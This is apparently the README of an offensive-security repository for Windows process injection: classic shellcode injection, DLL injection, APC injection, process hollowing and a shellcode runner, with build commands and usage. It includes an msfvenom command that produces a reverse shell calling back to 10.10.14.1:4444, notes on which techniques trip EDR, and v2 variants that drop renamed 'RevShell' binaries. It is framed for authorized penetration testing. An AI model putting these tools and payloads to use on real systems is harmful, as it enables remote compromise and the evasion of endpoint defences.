# Process Injection

Inject shellcode or DLLs into a running Windows process to execute code in its context. All examples target **x64**.

**MITRE ATT&CK**: T1055

## Files

| File | Technique | ATT&CK Sub |
|------|-----------|------------|
| [`classic_injection.c`](classic_injection.c) | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread(entry = shellcode)` | T1055.002 |
| [`dll_injection.c`](dll_injection.c) | Write DLL path + `CreateRemoteThread(entry = LoadLibraryA)` | T1055.001 |
| [`apc_injection.c`](apc_injection.c) | `VirtualAllocEx` + `WriteProcessMemory` + `QueueUserAPC` on every thread | T1055.004 |
| [`process_hollowing.c`](process_hollowing.c) | `CreateProcess SUSPENDED` -> `NtUnmapViewOfSection` -> map payload PE (relocations + imports) -> resume | T1055.012 |
| [`shellcode_runner.c`](shellcode_runner.c) | Local shellcode exec: `VirtualAlloc(RW)` -> copy -> `VirtualProtect(RX)` -> run (**NOT remote injection** — self-contained test harness) | T1055 base |

All injectors (classic + apc) use shellcode built with `EXITFUNC=thread` so the target process survives after the payload runs. Default payload = `WinExec("calc.exe", 0)`.

## Build (Linux cross-compile)

```bash
sudo apt install -y mingw-w64 && \
  for f in classic_injection apc_injection dll_injection process_hollowing shellcode_runner; do \
    x86_64-w64-mingw32-gcc -o $f.exe $f.c -lpsapi; \
  done
```

## Build (Windows MSVC)

In the x64 Native Tools Command Prompt for VS 2022:

```
cl classic_injection.c  /Fe:inject.exe
cl dll_injection.c      /Fe:dll_inject.exe  psapi.lib
cl apc_injection.c      /Fe:apc_inject.exe
cl process_hollowing.c  /Fe:hollow.exe
cl shellcode_runner.c   /Fe:runner.exe
```

## Usage

```
inject.exe       <PID|name>                 # shellcode -> target (calc pops, target survives)
dll_inject.exe   <PID> <absolute DLL path>  # DLL loaded in target, verified via module list
apc_inject.exe   <PID>                      # APC sprayed on all threads
hollow.exe       <payload.exe> [host.exe]   # host hollowed with payload (default host: svchost.exe)
runner.exe       [shellcode.bin] [thread]   # local shellcode test (self-injection)
```

## Customizing the payload

Replace the embedded shellcode in `classic_injection.c` or `apc_injection.c`:

```bash
# calc pop (safe for demo)
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c

# reverse shell
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=10.10.14.1 LPORT=4444 \
         EXITFUNC=thread -f c
```

**Always use `EXITFUNC=thread`.** The default `EXITFUNC=process` calls `ExitProcess()` on the target host after the payload runs — your target crashes.

## When to use each

| Technique | Pros | Cons |
|-----------|------|------|
| **Classic (CreateRemoteThread)** | Reliable, works on most processes | New thread with unbacked RWX start address is a loud EDR signal |
| **DLL Injection** | Payload is a compiled DLL (easier to write complex logic) | DLL on disk; `LoadLibrary` triggers ETW `ImageLoad` events |
| **APC Injection** | No new thread created | Only fires when a target thread enters an alertable wait |
| **Process Hollowing** | Payload runs under a legitimate process name | Complex (relocations + imports), unusual process-tree pattern |
| **Shellcode Runner** (self-injection) | Simplest shellcode test; validates msfvenom output before injection | Not a remote-injection primitive |

## v2 variants — identifiable child in Task Manager

The v1 files above spawn the generic shellcode payload (default `calc.exe`) — looks identical to any normal calc. **v2** variants pre-rename a system binary and patch its `FileDescription` so the child shows up in Task Manager with a custom name:

| File | What it drops | Big text (FileDescription) | Image name |
|---|---|---|---|
| [`classic_injection_v2.c`](classic_injection_v2.c) | `C:\Users\Public\RevShell_C.exe` | `RevShell-ClassicInj` | `RevShell_C.exe` |
| [`apc_injection_v2.c`](apc_injection_v2.c) | `C:\Users\Public\RevShell_A.exe` | `RevShell-APC Inject` | `RevShell_A.exe` |
| [`dll_injection_v2.c`](dll_injection_v2.c) | (depends on the DLL — reference: `../process-injection-2/revshell_pure_dll.dll`) | `RevShell - WinCmd Proc` | `revShell.exe` |
| [`process_hollowing_v2.c`](process_hollowing_v2.c) | `C:\Users\Public\RevShell_H.exe` (renamed host) | `RevShell-Hollow Proc` | `RevShell_H.exe` |
| [`shellcode_runner_v2.c`](shellcode_runner_v2.c) + [`.rc`](shellcode_runner_v2.rc) | the runner itself | `RevShell Runner` | `runner_v2.exe` |

Build v2 the same way as v1 (plus a resource compile step for `shellcode_runner_v2`):

```bash
# Linux cross-compile
for f in classic_injection_v2 apc_injection_v2 process_hollowing_v2; do
  x86_64-w64-mingw32-gcc -o $f.exe $f.c
done
x86_64-w64-mingw32-gcc -o dll_inject_v2.exe dll_injection_v2.c -lpsapi
x86_64-w64-mingw32-windres shellcode_runner_v2.rc -o rc.o
x86_64-w64-mingw32-gcc -o runner_v2.exe shellcode_runner_v2.c rc.o
```

The identifier approach used by each v2 variant:

- **Shellcode injectors (classic, APC)**: hand-crafted ~45-byte x64 shellcode calls `WinExec(renamed_path, SW_SHOWNORMAL)`. The injector pre-copies cmd.exe and patches its VERSIONINFO before firing.
- **DLL injection**: identifier logic lives inside the loaded DLL (reference: [`../process-injection-2/revshell_pure_dll.dll`](../process-injection-2/)). The v2 injector just loads any identifier-aware DLL.
- **Process hollowing**: renames and patches the host binary before `CreateProcess SUSPENDED`. The hollow runs under the custom name.
- **Shellcode runner**: the runner itself gets a custom VERSIONINFO via `.rc` — Task Manager Processes tab shows the runner as `"RevShell Runner"`.

## Legal

Authorized testing only.
